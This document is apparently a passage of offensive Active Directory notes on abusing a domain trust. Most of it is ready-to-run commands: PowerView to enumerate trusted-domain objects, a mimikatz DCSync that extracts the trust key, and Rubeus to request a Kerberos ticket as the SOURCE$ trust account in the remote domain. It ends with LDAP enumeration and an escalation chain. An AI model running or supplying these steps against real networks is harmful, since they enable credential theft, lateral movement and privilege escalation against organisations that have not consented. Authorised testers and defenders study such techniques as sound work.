```powershell
# FROM SOURCE.COM
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" | select name,trustPartner,trustDirection,trustAttributes,trustType,flatName
# name: target.com
# trustPartner: target.com
# trustDirection: 2              
# trustAttributes: 8                   
# trustType: 2                     
# flatName: TARGET
``` 

In this scenario, the value of the trust is not in granting direct privileges, but in allowing an identity tied to the trust relationship to exist and be accepted by the remote domain. If you compromise the TDO trust key, you can request a valid TGT from the `TARGET` KDC using the trust account (`SOURCE$`). That does not make you an administrator of `TARGET`, but it does give you legitimate authentication, query capability, and a real base to interact with services in the remote domain.

The offensive impact of the attack starts exactly there: you are no longer attacking `TARGET` as an external party without context, but as an identity that the remote domain itself recognizes as valid. In practice, this often translates into LDAP enumeration, ACL discovery, delegation review, identification of modifiable objects, and the search for subsequent escalation paths. The trust alone does not solve authorization; what it does is open the door so that authorization can later be abused if you find a misconfiguration.

- [ ] What changes in this scenario

- `trustDirection` stops being the main factor for this specific scenario.
- `SID Filtering` does not affect the initial acquisition of the TGT as a trust account, although it remains relevant for escalation scenarios based on PAC / ExtraSIDs.

- [ ] Requirements

1. Obtain the GUID of the trusted domain TDO

```powershell
Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties name,objectGUID | select name,objectGUID
```

2. Extract the trust key via DCSync using the TDO GUID

> Requires elevated privileges (high integrity, Domain Admin, or equivalent)

```powershell
mimikatz lsadump::dcsync /domain:source.com /guid:{GUID}
```

- `[Out]` = current key (the valid one now).
- `[Out-1]` = previous key (the one valid _before_ rotation).

`[Out]` and `[Out-1]` represent the current key and the previous key stored in the TDO. If both match, the trust has usually not rotated yet. If they are different, the current key (`[Out]`) must be used.

- [ ] Abuse

```powershell
.\Rubeus.exe asktgt /user:SOURCE$ /domain:TARGET.COM /dc:host.target.com /rc4:HASH_RC4 /nowrap /ptt

# Verify loaded tickets
klist
#0>	Client: SOURCE$ @ TARGET.COM
# Server: krbtgt/TARGET.COM @ TARGET.COM

# Confirm that enumeration via LDAP works
ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=target,DC=com --hostname target.com
```

- `/user:SOURCE$`: trust account representing the SOURCE domain inside TARGET.
- `/domain:TARGET.COM`: remote domain whose KDC will issue the TGT.
- `/dc:host.target.com`: specific DC to which the request will be sent.
- `/rc4:HASH_RC4`: trust key used as the authentication secret for that account.

> The result is not direct administrative privilege. The result is a valid TGT in `TARGET.COM` for `SOURCE$`, sufficient for authentication and enumeration against services in the remote domain.

- [ ] Limits and reality of trust account abuse

The trust account in TARGET is not administrative by default. Its real value does not lie in immediate privilege, but in the fact that it provides valid authentication, broad LDAP enumeration, and a useful starting position to search for ACLs, broken delegations, or exploitable misconfigurations.

```
Trust key → TGT en TARGET
↓
valid authentication
↓
broad LDAP enumeration
↓
you find ACLs / misconfigs
↓
you modify objects
↓
you escalate
```